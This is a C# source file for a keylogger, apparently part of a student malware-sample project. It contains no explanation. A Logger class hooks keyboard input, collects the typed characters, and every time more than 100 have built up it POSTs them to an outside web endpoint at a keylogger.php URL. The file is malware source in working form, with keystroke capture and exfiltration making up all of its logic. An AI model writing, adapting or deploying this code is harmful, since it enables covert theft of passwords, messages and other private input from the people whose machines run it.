using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Text;

namespace MalwareSample.Keylogger.Logger
{
    public class Logger
    {
        string logedText = "";
        private static readonly HttpClient client = new HttpClient();
        KeyboardHook keyhook;

        public Logger()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;  //Fix SSL

            keyhook = new Hook().GetHook() as KeyboardHook;
            keyhook.KeyWasPressed += new KeyboardHook.KeyPressed(Append);
        }

        public void Append(char? a)
        {
            if (a != null)
                logedText += a;

            if (logedText.Length > 100) Log();
        }

        public void Append(string a)
        {
            logedText += a;
        }

        public void Log()
        {
            Dictionary<string, string> values = new Dictionary<string, string>();

            lock (this)
            {
                values.Add("data", logedText);
                logedText = "";
            }
            values.TryGetValue("data", out string text);

            var content = new FormUrlEncodedContent(values);

            var response = client.PostAsync("https://www.zelvar.cz/skola/dp/malware/keylogger.php", content);

            /*Console.WriteLine(response.Result.Headers.ToString());
            Console.WriteLine(response.Result.Content.ReadAsStringAsync().Result.ToString());
            Console.WriteLine(text);*/
        }
    }
}
